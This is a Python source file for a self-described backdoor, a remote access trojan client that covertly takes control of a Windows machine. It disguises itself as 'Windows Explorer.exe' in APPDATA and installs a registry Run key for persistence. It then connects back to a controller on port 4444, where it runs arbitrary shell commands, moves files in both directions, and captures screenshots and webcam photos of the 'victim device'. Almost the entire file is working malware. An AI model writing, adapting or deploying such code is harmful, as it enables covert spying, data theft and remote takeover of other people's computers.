#!/usr/bin/python3

import socket, subprocess, json, os, base64, shutil, sys, mss, cv2

class Backdoor:
    # Backdoor class
    def __init__(self, address: tuple):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(address)

    def become_persistent(self):
        evil_file_location = os.path.join(os.environ.get('APPDATA', ''), 'Windows Explorer.exe')

        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            try:
                subprocess.call([
                    'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    '/v', 'update',
                    '/t', 'REG_SZ',
                    '/d', evil_file_location,
                    '/f'
                ], shell=True)
            except Exception as e:
                print(f"Error: {e}")
    
    def __del__(self):
        self.connection.close()
    
    def reliable_send(self, data):
        # Safety way to send data as json
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Safety way to receive data as json, until everything income
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_working_directory_to(self, path):
        # Method allows us to change directory
        os.chdir(path)
        return f'[+] Changing working directory to {os.path.abspath(path)}'

    def execute_system_command(self, command):
        # Method which executing command on victim device
        command = " ".join(command)
        return subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode()

    def read_file(self, file_path):
        # Function which read files on victim device
        with open(file_path, 'rb') as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, file_path, file_data):
        # Method writing data to file
        with open(file_path, 'wb') as file:
            file.write(base64.b64decode(file_data))
            return '[+] Upload successful.'
    
    def delete_file(self, file_path):
        # Deleting selected file
        if os.path.exists(file_path):
            os.remove(file_path)

    def screenshot(self):
        # Screenshot whole screens of victim device
        with mss.mss() as scr:
            scr.shot(mon = -1, output = 'screen.png')
            data = self.read_file('screen.png')
            self.delete_file('screen.jpg')
            return data

    def photo(self):
        # Taking photo from camera of victim device
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return '[-] Error: can\'t access to camera.'
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('photo.jpg', frame)
        cap.release()
        cv2.destroyAllWindows()

        data = self.read_file('photo.jpg')
        self.delete_file('photo.jpg')
        return data

    def run(self):
        # Method which run everythong - receiving, sending, executing, etc.
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit': # Ending connection and script
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1: # Execute changing working directory command and move us to path stored in command[1]
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == 'screenshot':
                    command_result = self.screenshot()
                elif command[0] == 'photo':
                    command_result = self.photo()
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = '[-] Error: {e}'
            
            self.reliable_send(command_result)

# Example
try:
    my_backdoor = Backdoor(('127.0.0.1', 4444))
    my_backdoor.run()
except Exception:
    sys.exit()


